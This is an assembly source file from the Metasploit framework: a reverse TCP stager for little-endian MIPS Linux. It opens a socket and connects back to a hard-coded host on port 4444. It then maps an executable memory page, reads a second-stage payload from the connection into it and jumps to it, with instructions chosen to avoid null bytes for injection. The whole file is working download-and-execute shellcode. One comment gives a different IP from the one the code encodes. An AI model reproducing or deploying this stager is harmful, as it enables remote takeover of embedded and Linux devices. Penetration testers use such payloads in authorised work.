##
# 
#        Name: stager_sock_reverse
#        Type: Stager
#   Qualities: No Nulls out of the IP / Port data
#   Platforms: Linux MIPS Little Endian
#     Authors: juan vazquez <juan.vazquez [at] metasploit.com>
#     License: 
#
#        This file is part of the Metasploit Exploit Framework
#        and is subject to the same licenses and copyrights as
#        the rest of this package.
#
# Description:
#
#        Implementation of a MIPS LE Linux reverse TCP stager.
#
#        File descriptor in $s2.
#
#        Assemble and create a relocatable object with:
#          as -o stager_sock_reverse.o stager_sock_reverse.s
#
#        Assemble, link and create an executable ELF with:
#          gcc -o stager_sock_reverse stager_sock_reverse.s
#
#        The tool "tools/metasm_shell.rb" can be used to easily
#        generate the string to place on:
#          modules/payloads/stagers/linux/mipsle/reverse_tcp.rb
##
	.text
	.align  2
	.globl  main
	.set    nomips16
main:
	.set    noreorder
	.set    nomacro

	# socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
	# a0: domain = PF_INET (2)
	# a1: type = SOCK_STREAM (2)
	# a2: protocol = IPPROTO_IP (0)
	# v0: syscall = __NR_socket (4183)
	li      $t7, -6
	nor     $t7, $t7, $zero
	addi    $a0, $t7, -3
	addi    $a1, $t7, -3
	slti    $a2, $zero, -1
	li      $v0, 4183
	syscall 0x40404
	sw      $v0, -4($sp) # store the file descriptor for the socket on the stack
	
	# connect(sockfd, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("192.168.172.1")}, 16)
	# a0: sockfd
	# a1: addr = AF_INET (2)
	# a2: addrlen = 16
	lw      $a0, -4($sp)
	li      $t7, -3
	nor     $t7, $t7, $zero
	sw      $t7, -30($sp)
	ori     $t6, $zero, 0x5c11  # port
	sw      $t6, -28($sp)
	lui     $t6, 0x100          # ip
	ori     $t6, $t6, 0x7f      # ip
	sw      $t6, -26($sp)
	addiu   $a1, $sp, -30
	li      $t4, -17
	nor     $a2, $t4, $zero
	li      $v0, 4170
	syscall 0x40404
	
	# mmap(0xffffffff, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
	# a0: addr = -1
	# a1: lenght = 4096
	# a2: prot = PROT_READ|PROT_WRITE|PROT_EXEC (7)
	# a3: flags = MAP_PRIVATE|MAP_ANONYMOUS (2050)
	# sp(16): fd = -1
	# sp(20): offset = 0
	li      $a0, -1
	li      $a1, 4097
	addi    $a1, $a1, -1
	li      $t1, -8
	nor     $t1, $t1, $0
	add     $a2, $t1, $0
	li      $a3, 2050
	li      $t3, -22
	nor     $t3, $t3, $zero
	add     $t3, $sp, $t3
	sw      $0, -1($t3)         # Doesn't use $sp directly to avoid nulls
	sw      $2, -5($t3)         # Doesn't use $sp directly to avoid nulls
	li      $v0, 4090
	syscall 0x40404
	sw      $v0, -8($sp)        # Stores the mmap'ed address on the stack

	# read(sockfd, addr, 4096)
	# a0: sockfd
	# a1: addr
	# a2: len = 4096
	lw      $a0, -4($sp)
	lw      $a1, -8($sp)
	li      $a2, 4097
	addi    $a2, $a2, -1
	li      $v0, 4003
	syscall 0x40404
	
	# jmp to the stage
	lw      $s1, -8($sp)
	lw      $s2, -4($sp)
	jalr    $s1

	.set    macro
	.set    reorder
